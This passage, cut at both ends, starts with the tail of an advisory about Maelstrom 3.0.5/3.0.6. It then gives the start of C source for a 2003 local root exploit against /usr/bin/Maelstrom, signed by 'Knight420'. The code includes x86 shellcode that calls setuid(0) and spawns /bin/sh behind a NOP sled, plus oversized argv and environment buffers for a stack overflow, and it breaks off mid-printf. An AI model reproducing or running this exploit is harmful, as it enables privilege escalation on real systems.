ted that although this vulnerability has been reported to affect Maelstrom version 3.0.6 and 3.0.5 previous versions might also be affected. /* * ================================================== * MaelstromX.c /usr/bin/Maelstrom local exploit * By: Knight420 * 05/20/03 * * Gr33tz to: sorbo, sonyy, sloth, and all of #open * * -player or -server works * ( ./MaelstromX 100 3 ) works on slackware 8.1 * * (C) COPYRIGHT Blue Ballz , 2003 * all rights reserved * ================================================= * */ #include <stdio.h> #define STACK_START 0xC0000000 #define SWITCH "-player" char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d" "\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3" "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0" "\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh"; int main(int argc, char *argv[]) { char buff[8200]; char buff2[8200]; int *ptr; int ret; char *arg[] = { "Maelstrom",SWITCH,buff,NULL } ; char *env[] = { buff2, NULL }; if(argc < 2) { printf ("Maelstrom Local Exploit by: Knight420
